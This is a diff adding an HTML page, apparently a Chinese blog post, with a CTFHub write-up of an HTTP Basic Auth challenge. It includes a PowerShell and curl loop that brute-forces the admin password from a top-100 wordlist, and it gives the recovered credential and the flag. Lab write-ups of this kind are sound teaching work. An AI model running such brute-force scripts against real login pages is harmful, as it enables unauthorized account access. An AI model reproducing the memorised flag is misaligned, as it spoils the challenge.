@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub 基础认证 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 750px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - Web前置技能 - HTTP协议 - 基础认证</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># HTTP协议</span>
+            <span class="tag"># Basic Auth</span>
+            <span class="tag"># 密码爆破</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>基础认证</li>
+            <li><strong>题目方向：</strong>Web - Web前置技能 - HTTP协议</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目附件：</strong><code>10_million_password_list_top_100.txt</code></li>
+        </ul>
+
+        <h2>二、解题工具</h2>
+        <ul>
+            <li>浏览器开发者工具（F12）</li>
+            <li>Burp Suite Repeater / Intruder</li>
+            <li>cURL（命令行工具）</li>
+        </ul>
+
+        <h2>三、解题思路与步骤</h2>
+        <ol>
+            <li>
+                <strong>信息收集：</strong>访问题目根路径，页面返回 <code>200 OK</code>，并提供了一个指向 <code>/flag.html</code> 的链接。
+            </li>
+            <li>
+                <strong>识别认证方式：</strong>直接访问 <code>/flag.html</code>，服务器返回 <code>401 Unauthorized</code>，响应头中包含：
+                <pre>WWW-Authenticate: Basic realm="Do u know admin ?"</pre>
+                这说明目标是 HTTP Basic Auth，并且 <code>realm</code> 中已经提示用户名大概率是 <code>admin</code>。
+            </li>
+            <li>
+                <strong>理解 Basic Auth：</strong>客户端会将用户名和密码拼接成 <code>username:password</code>，再做 Base64 编码并放入请求头：
+                <pre>Authorization: Basic base64(username:password)</pre>
+                cURL 的 <code>--user</code> 参数会自动完成这一过程。
+            </li>
+            <li>
+                <strong>利用密码字典：</strong>题目提供了 Top 100 密码表，因此只需固定用户名 <code>admin</code>，逐个测试密码。错误密码返回 <code>401</code>，正确密码返回 <code>200</code>：
+                <pre>$url = 'http://challenge-xxx.sandbox.ctfhub.com:10800/flag.html'
+$passwords = Get-Content -LiteralPath '.\10_million_password_list_top_100.txt'
+
+foreach ($password in $passwords) {
+    $code = curl.exe --silent --output NUL --write-out '%{http_code}' --max-time 8 --user "admin:$password" $url
+
+    if ($code -eq '200') {
+        Write-Output "password=$password"
+        break
+    }
+}</pre>
+            </li>
+            <li>
+                <strong>获取 Flag：</strong>密码表第 59 条命中，得到有效凭据 <code>admin:daniel</code>。使用该凭据访问：
+                <pre>curl.exe --user 'admin:daniel' http://challenge-xxx.sandbox.ctfhub.com:10800/flag.html</pre>
+                返回的页面中包含最终 Flag。
+            </li>
+        </ol>
+
+        <h2>四、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{c41b66f07d4c9370479f30d3}
+        </div>
+
+        <h2>五、解题总结</h2>
+        <ul>
+            <li><strong>响应头是重要信息来源：</strong><code>WWW-Authenticate</code> 直接暴露了认证方式和领域名称，并提示了用户名 <code>admin</code>。</li>
+            <li><strong>标准协议可以自动化测试：</strong>Basic Auth 的凭据格式固定，使用 cURL 或 Burp Suite Intruder 很容易结合密码字典进行批量验证。</li>
+            <li><strong>Basic Auth 并不安全：</strong>它只对凭据进行 Base64 编码，并未加密；如果通过 HTTP 传输，凭据可以被网络中间人直接还原。</li>
+            <li><strong>不要使用弱密码：</strong><code>daniel</code> 属于常见弱密码，攻击者可以通过字典快速得到凭据。</li>
+        </ul>
+    </div>
+</body>
+</html>
